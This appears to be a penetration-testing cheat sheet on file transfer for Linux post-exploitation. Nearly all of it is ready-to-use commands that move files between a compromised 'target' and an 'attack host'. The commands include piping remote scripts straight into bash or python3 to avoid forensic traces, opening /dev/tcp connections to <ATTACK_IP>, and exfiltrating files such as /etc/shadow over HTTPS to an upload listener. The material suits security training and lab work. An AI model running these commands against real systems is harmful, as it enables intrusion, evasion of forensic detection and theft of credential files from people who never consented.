## Base64 Transfer

Terminal access is available and the file is small enough for manual copy-paste.

Encode a file to a single-line base64 string for terminal output:

```
cat <FILE_PATH> | base64 -w 0; echo
```

Decode a base64 string back into a binary or text file on the target:

```
echo -n '<BASE64_STRING>' | base64 -d > <FILE_PATH>
```

- **Hash mismatch** indicates data corruption during the copy-paste process; always verify with `md5sum`.

## Web Downloads

HTTP/S connectivity exists and standard binaries are available on the target filesystem.

Download a file to a specific local path using wget:

```
wget <URL> -O <FILE_PATH>
```

Download a file to a specific local path using curl:

```
curl -o <FILE_PATH> <URL>
```

- Tool comparison:
    - wget: use `-O` to define the output destination.
    - curl: use `-o` (lowercase) to define the output destination.

## Fileless Execution

Bypassing disk writes is required to minimize forensic footprint during payload execution.

Pipe a remote script directly into bash for memory-resident execution:

```
curl <URL> | bash
```

Pipe a remote Python script into the interpreter without saving to disk:

```
wget -qO- <URL> | python3
```

- **Temporary files** may still be created on the OS depending on the specific payload used (e.g., `mkfifo`).

## Bash /dev/tcp Redirection

Standard transfer tools like wget or curl are missing; requires Bash 2.04+ compiled with net redirections.

1. Open a read/write file descriptor to the attack host:

```
exec 3<>/dev/tcp/<ATTACK_IP>/<PORT>
```

2. Manually craft and send an HTTP GET request through the descriptor:

```
echo -e "GET /<FILE_PATH> HTTP/1.1\n\n">&3
```

3. Read the incoming response from the attack host:

```
cat <&3
```

## SCP Transfers

SSH (TCP/22) is reachable and valid credentials or SSH keys are known for the remote host.

Download a file from an attack host to the current directory:

```
scp <USERNAME>@<ATTACK_IP>:<FILE_PATH> .
```

Upload a local file from the target to the attack host:

```
scp <FILE_PATH> <USERNAME>@<ATTACK_IP>:<FILE_PATH>
```

- **Primary credential exposure** occurs when using your main keys or passwords on a compromised machine; use temporary accounts.

## Secure Web Upload

Secure exfiltration of sensitive files (e.g., `/etc/shadow`) is required over encrypted channels.

1. Install the uploadserver module on the attack host:

```
python3 -m pip install --user uploadserver
```

2. Generate a self-signed certificate for HTTPS:

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

3. Start the HTTPS upload listener:

```
python3 -m uploadserver <PORT> --server-certificate server.pem
```

4. Exfiltrate files from the target using curl:

```
curl -X POST https://<ATTACK_IP>/upload -F 'files=@<FILE_PATH>' --insecure
```

- **Insecure flag** (`--insecure`) is mandatory when using self-signed certificates to prevent curl from failing on the TLS handshake.

## Local Web Servers

Target files must be made available for download by the attack host via ad-hoc listeners.

Spawn a Python 3 listener on all interfaces:

```
python3 -m http.server <PORT>
```

Spawn a Python 2.7 listener on all interfaces:

```
python2.7 -m SimpleHTTPServer <PORT>
```

Spawn a PHP listener on all interfaces:

```
php -S 0.0.0.0:<PORT>
```

Spawn a Ruby listener on all interfaces:

```
ruby -run -ehttpd . -p<PORT>
```

- **Inbound traffic blocks** by host or network firewalls will prevent the attack host from reaching these listeners.